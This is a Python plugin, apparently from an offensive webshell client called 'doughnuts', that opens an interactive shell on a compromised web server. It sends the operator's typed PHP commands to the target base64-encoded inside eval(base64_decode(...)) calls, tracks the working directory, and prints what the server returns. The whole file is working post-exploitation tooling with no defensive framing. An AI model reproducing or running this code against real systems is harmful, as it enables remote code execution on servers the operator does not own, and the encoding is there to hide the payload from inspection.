from libs.config import gget, alias, color, set_namespace
from libs.myapp import send, base64_encode
from libs.app import getline


@alias(func_alias="ws")
def run():
    """
    webshell

    Get a webshell of target system.
    """
    print(color.cyan("Eenter interactive temporary webshell...\n\nUse 'back' command to return doughnuts.\n"))
    pwd = send(f'print(getcwd());').r_text.strip()
    while gget("loop"):
        print(f"webshell:{pwd} >> ", end="")
        data = getline()
        lower_data = data.lower()
        if (lower_data.lower() in ['exit', 'quit', 'back']):
            break
        if (data == ''):
            print()
            continue
        data = base64_encode(data)
        b64_pwd = base64_encode(pwd)
        if (lower_data.startswith("cd ") and len(lower_data) > 3):
            path = base64_encode(lower_data[3:].strip())
            pwd = send(f'chdir(base64_decode(\'{b64_pwd}\'));chdir(base64_decode(\'{path}\'));print(getcwd());').r_text.strip()
        else:
            req = send(f'eval("chdir(base64_decode(\'{b64_pwd}\'));eval(base64_decode(\'{data}\'));");')
            print("\n" + req.r_text.strip() + "\n")
    set_namespace("webshell", False)
